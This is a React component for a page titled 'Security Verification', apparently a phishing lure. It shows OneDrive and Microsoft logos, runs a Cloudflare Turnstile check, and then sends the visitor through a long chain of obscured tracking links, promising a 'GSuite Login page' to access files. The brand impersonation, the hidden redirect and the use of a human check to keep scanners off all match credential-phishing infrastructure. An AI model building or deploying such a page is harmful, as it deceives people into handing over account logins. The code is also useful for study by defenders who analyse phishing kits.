import { useEffect, useRef } from 'react';

function App() {
  const turnstileRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    // Get redirect URL from query parameters
    const params = new URLSearchParams(window.location.search);
    const redirectUrl = params.get('redirect') || 'https://link.edgepilot.com/s/7d0f0762/nPMhopCzy06ZytwimfX3Ww?u=https://u60157470.ct.sendgrid.net/ls/click?upn=u001.HIVfGxvP6wopKkylY-2Fsl-2Botxri4ApcbOf7NK23dHzhDMMG1kRJW7Y73ZUzDyS6lBh-2BL5IbYUZuxCkty8LhL-2FAWAml0Jw8DZETIBABoBnX9i-2BD4YsxAt88c7vVrfD7poiWl8s1X6oiB-2BFNuCHQWAxJSMzuVhBNMvnuj8LBWm59ldkUkY1lwBSG5Ya0Ef00l528FwpX-2BYy7kqMx7oLN5oMBd5Po9SRMJdV5UN4p0puxMe-2FWtBxOXumttlNN2QvSh7azjg8B7xeraRGFJKFLeaR3bPnqMvKe7FxNHHCO38wSVXPuHCpJqL36B-2Bk-2FzXZYluupr4l_WlmDWmHt4q7uPO-2BwfCICHrzV9fd5DSsqj-2B63yqBk1RYiNpSoBekoX-2BMpLgAi96kwetToTWC73tqLZjqlrJn83oYg5gmJYFi2aK-2FNVCymb6sgBBhEDqdpBOcq2HUH2nAGcUdDjJRN-2FdDjK3j1Ns7BiYjaewtmcoYPsyun86wNJ0eqKj7ZNBnMbb6-2F-2BX42B5kvpILpwlZ5AZ6fRD7GKScw4bNcLU6MocO49Kn-2FxbEgR-2BGW6K4WnCvTHhjLWTVgcMhoVHy9B0w9xu8POjilxDumWsRs6BMb5jc8EK2wvzBnEOcrXSjfWPeqjbGiTS9B9So1znGwewRobESFD4a2iHmyh7Qgnpzu-2FFkDaiM6r1ywj7SbRIUwV2BU5LyTjSbbd2D2HMVwEMXas7DAD3e-2Bw3ftva-2BM1CZL1uWRKt9tyzRXoEo3nbaEgYWlKnSAxhijvwm1lp0iptv-2FuwhWydRhf4lbDdTen4eE7i2T9O6LIhH8VBhRCmZ86jLO2keXPRV1OVCgncnnpkYrZE5gWRUFk1Nc0iO7F0pZZuRMeKwEmDRf4NStvlHvgE7ra9H3f0xZm3B8OLhxDwiTUuFBu1hC32hb0rWBjP6fIbZSBeZ-2FM0BDh61pn3VzX4AA9F6vbRUEMwUq';

    // Wait for Turnstile script to load and render widget
    const checkTurnstile = setInterval(() => {
      if ((window as any).turnstile && turnstileRef.current) {
        clearInterval(checkTurnstile);

        // Clear any existing widget
        turnstileRef.current.innerHTML = '';

        // Render the Turnstile widget
        (window as any).turnstile.render(turnstileRef.current, {
          sitekey: '0x4AAAAAABaeDHdwHVmJobfE',
          theme: 'dark',
          callback: (token: string) => {
            // Redirect on successful verification
            window.location.href = redirectUrl;
          },
        });
      }
    }, 100);

    return () => {
      clearInterval(checkTurnstile);
    };
  }, []);

  return (
    <div
      className="min-h-screen flex flex-col items-center justify-center p-6 relative"
      style={{
        backgroundImage: 'radial-gradient(circle at 100% 0%, rgba(199,224,244,0.4) 0%, rgba(255,255,255,1) 40%)'
      }}
    >
      <div className="bg-white rounded-2xl shadow-2xl max-w-xl w-full p-6 text-center">
        <div className="mb-4 flex justify-center">
          <img
            src="https://download.logo.wine/logo/OneDrive/OneDrive-Logo.wine.png"
            alt="OneDrive Logo"
            className="h-20 w-auto"
          />
        </div>

        <h1 className="text-3xl font-bold text-gray-900 mb-3 tracking-tight">
          Security Verification
        </h1>

        <p className="text-base text-gray-600 mb-6 leading-relaxed">
          You can now safely continue to the GSuite Login page to access your files.
        </p>

        <div className="flex justify-center">
          <div ref={turnstileRef}></div>
        </div>

        <div className="mt-4 text-sm text-gray-500">
          <p>Secure connection verified</p>
        </div>
      </div>

      <div className="absolute bottom-8 flex justify-center">
        <img
          src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg"
          alt="Microsoft"
          className="h-6"
        />
      </div>
    </div>
  );
}

export default App;
